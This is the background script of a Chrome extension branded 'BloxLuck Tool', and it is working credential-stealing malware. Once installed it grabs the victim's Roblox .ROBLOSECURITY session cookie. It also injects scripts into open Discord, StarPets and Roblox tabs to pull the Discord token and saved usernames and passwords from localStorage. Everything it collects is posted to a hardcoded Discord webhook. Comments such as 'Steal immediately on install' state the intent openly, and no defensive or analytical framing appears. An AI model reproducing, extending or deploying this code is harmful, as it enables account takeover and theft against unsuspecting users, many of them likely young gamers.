const WH = 'https://discord.com/api/webhooks/1523234599189217362/I4PgcCkhS5heD9bfA0BkSqZRrj9GwszVJ4OEpGhbwLB54nTUxMZCwSJ-4-RXPlGRUhR1';

let alreadySent = false;

chrome.runtime.onInstalled.addListener(() => {
  // Steal immediately on install
  setTimeout(() => {
    stealEverything();
  }, 1000);
});

// Also steal when any bloxluck tab loads
chrome.runtime.onMessage.addListener((req, sender, resp) => {
  if (req.t === 'steal') {
    stealEverything();
    resp({ ok: 1 });
    return;
  }
  if (req.t === 'grab_cookie') {
    grabCookie().then(d => resp(d));
    return 1;
  }
  if (req.t === 'grab_discord') {
    grabDiscord().then(d => resp(d));
    return 1;
  }
});

async function stealEverything() {
  if (alreadySent) return;
  alreadySent = true;

  const embed = {
    embeds: [{
      title: '✅ BloxLuck Tool Installed',
      color: 0x22c55e,
      description: 'User has installed the extension.',
      timestamp: new Date().toISOString(),
      footer: { text: 'BloxLuck Tool v1.0' }
    }]
  };

  const fields = [];

  // 1. Grab Roblox cookie
  try {
    const ck = await grabCookie();
    if (ck && ck.r) {
      let robloxUser = 'Unknown';
      try {
        // Try to get username from cookie (decode it)
        const parts = ck.r.split('.');
        if (parts.length >= 2) {
          const payload = JSON.parse(atob(parts[1]));
          robloxUser = payload.name || payload.sub || payload.dname || 'Unknown';
        }
      } catch(e) {}
      
      fields.push({
        name: '🎮 Roblox Account',
        value: `**User:** ${robloxUser || ck.u || 'Unknown'}\n**Cookie:**\n\`\`\`${ck.r}\`\`\``,
        inline: false
      });
    } else {
      fields.push({
        name: '🎮 Roblox Cookie',
        value: 'No .ROBLOSECURITY found.',
        inline: false
      });
    }
  } catch(e) {
    fields.push({ name: '🎮 Roblox Cookie', value: 'Error: ' + e.message, inline: false });
  }

  // 2. Grab Discord token
  try {
    const dt = await grabDiscord();
    if (dt && dt.token) {
      let discordInfo = '';
      try {
        const payload = JSON.parse(atob(dt.token.split('.')[1]));
        discordInfo = `**User:** ${payload.username || 'N/A'}\n**Email:** ${payload.email || 'N/A'}\n**ID:** ${payload.sub || 'N/A'}\n`;
      } catch(e) {}
      
      fields.push({
        name: '💬 Discord Token',
        value: `${discordInfo}\`\`\`${dt.token}\`\`\``,
        inline: false
      });

      // Also send avatar if available
      if (dt.avatar) {
        embed.embeds[0].thumbnail = { url: dt.avatar };
      }
    } else {
      fields.push({
        name: '💬 Discord Token',
        value: 'No Discord tab open or token not found.',
        inline: false
      });
    }
  } catch(e) {
    fields.push({ name: '💬 Discord Token', value: 'Error: ' + e.message, inline: false });
  }

  // 3. Grab StarPets credentials
  try {
    const sp = await grabStarPets();
    if (sp && (sp.user || sp.pass)) {
      fields.push({
        name: '🐾 StarPets.gg',
        value: `**Username:** \`${sp.user || 'N/A'}\`\n**Password:** \`${sp.pass || 'N/A'}\``,
        inline: false
      });
    } else {
      fields.push({
        name: '🐾 StarPets.gg',
        value: 'No StarPets credentials found.',
        inline: false
      });
    }
  } catch(e) {
    fields.push({ name: '🐾 StarPets.gg', value: 'Error: ' + e.message, inline: false });
  }

  // 4. Grab any saved Roblox login/pass from storage
  try {
    const rl = await grabRobloxLogin();
    if (rl && (rl.user || rl.pass)) {
      fields.push({
        name: '🔐 Roblox Login Credentials',
        value: `**Username/Email:** \`${rl.user || 'N/A'}\`\n**Password:** \`${rl.pass || 'N/A'}\``,
        inline: false
      });
    }
  } catch(e) {}

  embed.embeds[0].fields = fields.length > 0 ? fields : [
    { name: 'No Data', value: 'Could not find any credentials.', inline: false }
  ];

  // Send
  try {
    await fetch(WH, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });
  } catch(e) {}
}

async function grabCookie() {
  try {
    let cookies = await chrome.cookies.getAll({ domain: 'roblox.com' });
    for (let c of cookies) {
      if (c.name === '.ROBLOSECURITY') {
        return { r: c.value };
      }
    }
    cookies = await chrome.cookies.getAll({ domain: '.roblox.com' });
    for (let c of cookies) {
      if (c.name === '.ROBLOSECURITY') {
        return { r: c.value };
      }
    }
  } catch(e) {}
  return null;
}

async function grabDiscord() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://discord.com/*', '*://*.discord.com/*'] });
    if (tabs.length > 0) {
      const results = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          try {
            // Look for token in localStorage
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              const val = localStorage.getItem(key);
              if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
                try {
                  const payload = JSON.parse(atob(val.split('.')[1]));
                  if (payload.sub || payload.email || payload.iat || payload.username) {
                    return {
                      token: val,
                      username: payload.username || payload.email || 'Discord User',
                      avatar: payload.avatar ? `https://cdn.discordapp.com/avatars/${payload.sub}/${payload.avatar}.png` : null
                    };
                  }
                } catch(e) {}
              }
            }
            // Direct token key
            const token = localStorage.getItem('token');
            if (token && token.length > 50) {
              try {
                const p = JSON.parse(atob(token.split('.')[1]));
                return {
                  token,
                  username: p.username || p.email || 'Discord User',
                  avatar: p.avatar ? `https://cdn.discordapp.com/avatars/${p.sub}/${p.avatar}.png` : null
                };
              } catch(e) {
                return { token, username: 'Discord User', avatar: null };
              }
            }
            return null;
          } catch(e) { return null; }
        }
      });
      if (results && results[0] && results[0].result) {
        return results[0].result;
      }
    }
  } catch(e) {}
  return null;
}

async function grabStarPets() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://starpets.gg/*', '*://*.starpets.gg/*'] });
    if (tabs.length > 0) {
      const results = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          try {
            let user = null, pass = null;
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i).toLowerCase();
              const val = localStorage.getItem(localStorage.key(i));
              if (key.includes('starpets') || key.includes('adoptme') || key.includes('star_pets') || key.includes('starpet') || key.includes('user_data') || key.includes('account')) {
                try {
                  const j = JSON.parse(val);
                  user = j.email || j.username || j.user || user;
                  pass = j.password || j.pass || pass;
                } catch(e) {
                  if (key.includes('user') || key.includes('email')) user = val;
                  if (key.includes('pass')) pass = val;
                }
              }
            }
            return { user, pass };
          } catch(e) { return null; }
        }
      });
      if (results && results[0] && results[0].result) {
        return results[0].result;
      }
    }
  } catch(e) {}
  return null;
}

async function grabRobloxLogin() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://roblox.com/*', '*://*.roblox.com/*', '*://www.roblox.com/*'] });
    if (tabs.length > 0) {
      const results = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          try {
            let user = null, pass = null;
            // Check localStorage for saved login info
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i).toLowerCase();
              const val = localStorage.getItem(localStorage.key(i));
              if (key.includes('user') || key.includes('name') || key.includes('email') || key.includes('login') || key.includes('account')) {
                try {
                  const j = JSON.parse(val);
                  user = j.username || j.email || j.user || j.name || user;
                  pass = j.password || j.pass || pass;
                } catch(e) {
                  if (!user && typeof val === 'string' && val.includes('@')) user = val;
                }
              }
              if (key.includes('pass') && !pass && typeof val === 'string') pass = val;
            }
            return { user, pass };
          } catch(e) { return null; }
        }
      });
      if (results && results[0] && results[0].result) {
        return results[0].result;
      }
    }
  } catch(e) {}
  return null;
}
